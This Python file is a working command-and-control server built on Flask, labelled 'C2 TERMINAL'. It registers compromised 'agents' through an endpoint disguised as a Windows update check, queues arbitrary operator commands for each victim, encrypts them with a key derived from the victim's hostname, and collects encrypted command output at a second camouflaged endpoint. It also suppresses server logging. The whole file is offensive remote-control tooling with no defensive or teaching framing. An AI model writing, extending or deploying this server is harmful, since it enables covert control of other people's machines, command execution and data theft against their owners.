#!/usr/bin/env python3
from flask import Flask, request, jsonify
from collections import defaultdict
from datetime import datetime
from threading import Thread
from Crypto.Cipher import AES
import base64, logging, time

app = Flask(__name__)
logging.getLogger('werkzeug').setLevel(logging.ERROR)
app.logger.setLevel(logging.ERROR)

agents = {}
command_queue = defaultdict(list)

def encrypt_cmd(text, key):
    aes_key = key.encode().ljust(16, b'\x00')[:16]
    cipher = AES.new(aes_key, AES.MODE_ECB)
    data = text.encode()
    pad = 16 - (len(data) % 16)
    data += bytes([pad] * pad)
    return base64.b64encode(cipher.encrypt(data)).decode()

def decrypt_output(data, key):
    try:
        aes_key = key.encode().ljust(16, b'\x00')[:16]
        cipher = AES.new(aes_key, AES.MODE_ECB)
        plain = cipher.decrypt(data)
        
        # Remove PKCS7 padding
        if len(plain) > 0:
            pad = plain[-1]
            if isinstance(pad, int):
                pad_len = pad
            else:
                pad_len = ord(pad)
            
            if pad_len > 0 and pad_len <= 16:
                plain = plain[:-pad_len]
        
        return plain.decode(errors='replace')
    except Exception as e:
        return f"[!] Decrypt error: {str(e)}"

@app.route('/windows/checkforupdate', methods=['POST'])
def checkforupdate():
    ip = request.remote_addr
    try:
        for line in request.get_data().decode(errors='replace').splitlines():
            if line.startswith('Host:'):
                agents[ip] = {'hostname': line.split(':', 1)[1].strip(), 'last_seen': datetime.now()}
                break
    except:
        pass
    
    resp = {'status': 'ok'}
    if ip in command_queue and command_queue[ip]:
        cmd = command_queue[ip].pop(0)
        host = agents[ip]['hostname'] if ip in agents else 'unknown'
        resp['command'] = encrypt_cmd(cmd, host)
        resp['encrypted'] = "True"
    return jsonify(resp), 200

@app.route('/update/servicedata', methods=['POST'])
def receive_output():
    encoded_data = request.get_data()
    if len(encoded_data) < 1:
        return jsonify({'status': 'ok'}), 200
    
    try:
        data = base64.b64decode(encoded_data)
    except:
        return jsonify({'status': 'ok'}), 200
    
    msg_type = data[0]
    payload = data[1:]
    
    ip = request.remote_addr
    if ip not in agents:
        return jsonify({'status': 'ok'}), 200
    
    hostname = agents[ip]['hostname']
    if msg_type == 3:  # MSG_OUT
        try:
            plain = decrypt_output(payload, hostname)
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(f"\n[{timestamp}] [OUTPUT from {hostname}]\n{plain}\n")
        except Exception as e:
            print(f"\n[ERROR] Failed to process output: {e}")
            print(f"  Payload length: {len(payload)}")
            print(f"  Hostname key: {hostname}")
    
    agents[ip]['last_seen'] = datetime.now()
    return jsonify({'status': 'ok'}), 200

def list_agents():
    if not agents:
        print("  [!] No agents\n")
        return []
    print("\n" + "="*60)
    agent_list = list(sorted(agents.keys()))
    for i, ip in enumerate(agent_list, 1):
        info = agents[ip]
        age = (datetime.now() - info['last_seen']).total_seconds()
        status = "ACTIVE" if age < 35 else "INACTIVE"
        print(f"[{i}] {info['hostname']:<20} {status:<10} ({ip})")
    print("="*60 + "\n")
    return agent_list

def interactive_cli():
    time.sleep(1)
    print("\n╔═════════════════════════════════╗")
    print("║     C2 TERMINAL - NUMBERED      ║")
    print("║ agent - list | send - queue cmd ║")
    print("║ quit  - exit | help - commands  ║")
    print("╚═════════════════════════════════╝\n")
    
    while True:
        try:
            cmd = input("c2> ").strip().lower()
            if not cmd:
                continue
            elif cmd in ['agents', 'list']:
                list_agents()
            elif cmd in ['send', 'command']:
                agent_list = list_agents()
                if not agent_list:
                    continue
                try:
                    idx = int(input("Select [#]: ")) - 1
                    if idx < 0 or idx >= len(agent_list):
                        print("[!] Invalid number\n")
                        continue
                    target_ip = agent_list[idx]
                    payload = input("Command: ").strip()
                    if payload:
                        command_queue[target_ip].append(payload)
                        print(f"[+] Queued for {agents[target_ip]['hostname']}\n")
                except ValueError:
                    print("[!] Number only\n")
            elif cmd in ['quit', 'exit']:
                print("\n[*] Exiting...\n")
                import os; os._exit(0)
            elif cmd == 'help':
                print("Commands: agents, send, quit, help\n")
            else:
                print(f"[!] Unknown: {cmd}\n")
        except KeyboardInterrupt:
            print("\n\n[*] Exiting...\n")
            import os; os._exit(0)
        except Exception as e:
            print(f"[!] Error: {e}\n")

if __name__ == '__main__':
    Thread(target=interactive_cli, daemon=True).start()
    app.run(host='0.0.0.0', port=80, use_reloader=False, threaded=True)
